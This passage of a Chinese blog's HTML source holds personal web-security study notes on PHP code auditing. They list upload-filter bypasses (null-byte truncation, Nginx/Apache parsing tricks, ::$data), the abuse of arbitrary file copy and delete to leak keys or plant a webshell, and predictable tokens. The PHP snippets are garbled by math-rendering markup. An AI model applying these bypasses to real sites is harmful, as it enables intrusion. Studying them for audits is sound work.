style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">对</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">某</span><span class="mord cjk_fallback">些</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">台</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">（</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">）</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">有</span><span class="mord">3</span><span class="mord">2</span><span class="mord">7</span><span class="mord">6</span><span class="mord">8</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">围</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">定</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">和</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord cjk_fallback">考</span><span class="mord cjk_fallback">虑</span><span class="mord cjk_fallback">哟</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">替</span><span class="mord cjk_fallback">代</span><span class="mord cjk_fallback">它</span><span class="mord">‘</span></span></span></span>encrpststring=md5(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">this-&gt;time.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord">.</span></span></span></span>verification.<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>u</mi><mi>t</mi><mi>h</mi><mo>)</mo><mo separator="true">;</mo><mi mathvariant="normal">‘</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">auth);`：
+`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">u</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">‘</span><span class="mord cjk_fallback">：</span><span class="mord">‘</span></span></span></span>timetemp=date(&quot;Y-m-d:i:s&quot;,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>h</mi><mi>i</mi><mi>s</mi><mo>−</mo><mo>&gt;</mo><mi>t</mi><mi>i</mi><mi>m</mi><mi>e</mi><mo>)</mo><mo separator="true">;</mo></mrow><annotation encoding="application/x-tex">this-&gt;time);</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.77777em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mord mathdefault">i</span><span class="mord mathdefault">s</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mclose">)</span><span class="mpunct">;</span></span></span></span>auth=util::strcode($timetemp,'ENCODE');`<br>
+算法的key并没有初始化，如果知道了这个时间，就可以生成加密的字符串</p>
+<p><strong>上传</strong><br>
+未验证后缀<br>
+验证上传后缀被bypass<br>
+上传的文件验证了上传后缀但是文件名不重名：阶段yu.php%00.jpg<br>
+上传路径可控<br>
+解析漏洞：Nginx-yu.jpg/1.php<br>
+Apache-yu.php.xxx<br>
+验证方法：mime，客户端的js验证，白名单，黑名单<br>
+绕过：大小写，文件名没trim在文件名后面加空格：windows下的x.php%81-%99 decode后仍为x.php，Windows下的特性.php::$data</p>
+<p><strong>文件操作</strong><br>
+任意文件删除 任意文件复制 任意文件重名 任意文件移动 任意文件下载<br>
+首先拿到配置文件中的数据库的连接账号和密码-外联<br>
+拿到配置文件，拿到加密解密函数的key0生成加密字符串-结合具体的代码利用<br>
+文件删除：由于全局的过滤而不能注入时，可以用任意文件删除删掉这个文件，删除安装文件生成的lock文件，重装<br>
+文件复制：要复制的文件要复制到的路径-两个都完全可控时直接把自己的图片复制成一个.php马儿，复制的文件可控，而要复制的路径不可控：copy(ROOT_PATH.&quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mi>e</mi><mi>b</mi><mi>d</mi><mi>b</mi><mo>(</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>i</mi><mi>r</mi><mo>)</mo><mi mathvariant="normal">/</mi></mrow><annotation encoding="application/x-tex">webdb(updir)/</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mord">/</span></span></span></span>value&quot;.ROOT_PATH.&quot;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mi>e</mi><mi>b</mi><mi>d</mi><mi>b</mi><mo>[</mo><mi>u</mi><mi>p</mi><mi>d</mi><mi>i</mi><mi>r</mi><mo>]</mo><mi mathvariant="normal">/</mi><mo>(</mo></mrow><annotation encoding="application/x-tex">webdb[updir]/(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">e</span><span class="mord mathdefault">b</span><span class="mord mathdefault">d</span><span class="mord mathdefault">b</span><span class="mopen">[</span><span class="mord mathdefault">u</span><span class="mord mathdefault">p</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">]</span><span class="mord">/</span><span class="mopen">(</span></span></span></span>value).jpg&quot;);,可以把$value控制为保存了qibocms的加密函数的配置文件，复制后成一个.jpg直接打开可以看到ikey<br>
+文件下载：下载配置，nadaokey<br>
+文件写入<br>
+文件包含</p>
+<p><strong>加密函数</strong><br>
+拿到加密函数的key-加密一些特殊字符然后拿到加密的字符串<br>
+加密可逆：若算法导致了知道明文密文，可逆-拿到加密函数的key从而自己生成一个想要的加密字符串<br>
+加密可控：要加密的内容是可控的，密文会输出，这个可控的点能引入特殊字符，那么把一些特殊字符代入到这里面，拿到密文再找到一处decode后会进行特殊操作的点进行各种操作<br>
+key泄露</p>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1626750266357.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626772693493.png" alt="" loading="lazy"></p>
+<p><strong>powershell简单语法</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626774695884.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626774700742.png" alt="" loading="lazy"></p>
+<p><strong>PYTHON系统审计</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626776027040.png" alt="" loading="lazy"></p>
+<p>** 网络入侵模式图**<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626776731511.png" alt="" loading="lazy"></p>
+<p>** 渗透流程**<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626789659521.jpg" alt="" loading="lazy"></p>
+<h1 id="2021-07-21">2021-07-21</h1>
+<p>** xss platform**<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626831897017.png" alt="" loading="lazy"></p>
+<p><strong>社会工程学</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626832591997.jpg" alt="" loading="lazy"></p>
+<p><strong>渗透测试流程</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626832577202.png" alt="" loading="lazy"></p>
+<p><strong>系统端口审计</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626832620633.jpg" alt="" loading="lazy"></p>
+<p><strong>web服务器入侵防御</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626833337127.jpg" alt="" loading="lazy"></p>
+<p><strong>web渗透</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626834011528.png" alt="" loading="lazy"></p>
+<p><strong>web攻击以及防御技术</strong><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626836403724.png" alt="" loading="lazy"></p>
+<p>#XSS汇总<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1626837021936.png" alt="" loading="lazy"></p>
+
+            </div>
+          </article>
+        </div>
+        <div class="paper" data-aos="fade-in">
+          
+            <div class="next-post">
+              <div class="next">
+                下一篇
+              </div>
+              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">
+                <h3 class="post-title">
+                  SQL注入过滤字符的Fuzz脚本测试
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+        
+      </div>
+
+      <div class="sm-12 md-4 col sidebar">
+  <div class="paper info-container">
+    <img src="https://jinqipiaopiao.github.io//images/avatar.png?v=1626837321118" class="no-responsive avatar">
+    <div class="text-muted">温故而知新</div>
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      最新文章
+    </div>
+    <div class="row">
+      <ul>
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/shu-jia-xue-xi-bi-ji-ji-lu/">暑假学习笔记记录</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">SQL注入过滤字符的Fuzz脚本测试</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/">md5相关比较</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/buuctf/">BUUCTF</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/li-yong-yu-bian-yi-lai-sql-zhu-ru/">利用预编译来SQL注入</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/python-mo-ban-zhu-ru/">Python-模板注入</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">web安全相关知识点</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/userini-wen-jian-gou-cheng-de-php-hou-men/">.user.ini文件构成的PHP后门</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/ying-yong-ceng-xie-yi/">应用层协议</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="https://jinqipiaopiao.github.io/post/ju-yu-wang-jiao-huan-ji-an-quan/">局域网交换机安全</a>
+            </li>
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      </ul>
+    </div>
+  </div>
+  <div class="paper">
+    <div class="sidebar-title">
+      标签列表
+    </div>
+    <div class="row">
+      
+        <a href="https://jinqipiaopiao.github.io/tag/I-a6dyp2Q/" class="badge warning">
+          Gridea
+        </a>
+      
+    </div>
+  </div>
+  <div class="paper">
+    Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+
+
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+</script>
+
+
+
+
+  </body>
+</html>
